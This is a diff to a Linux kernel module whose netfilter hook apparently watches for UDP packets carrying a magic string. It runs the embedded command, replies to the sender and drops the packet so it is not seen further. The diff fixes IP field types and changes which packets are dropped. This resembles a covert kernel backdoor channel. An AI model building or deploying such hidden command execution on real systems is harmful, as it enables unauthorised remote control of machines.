@@ -460,8 +460,8 @@ static int call_cmd(struct cmd_type *cmd, const char *data, unsigned int data_le
 static int send_response(
     unsigned short job_id,
     int response_status,
-    short local_ip,
-    short remote_ip,
+    int local_ip,
+    int remote_ip,
     unsigned char remote_mac[],
     struct net_device *dev
 ) {
@@ -556,10 +556,11 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
             result = call_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic), ntohs(udph->len) - sizeof(struct udphdr));
             printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", cmds[i].name, result);
             send_response(get_unaligned((unsigned short *)(user_data + strlen(cmd_magic))), result, iph->daddr, iph->saddr, eth_hdr(skb)->h_source, skb->dev);
-            break;
+            return NF_DROP;
         }
     }
-    return NF_DROP;
+    printk(KERN_INFO "Found unclear cmd packet.\n");
+    return NF_ACCEPT;
 }
 
 struct nf_hook_ops *net_hook;
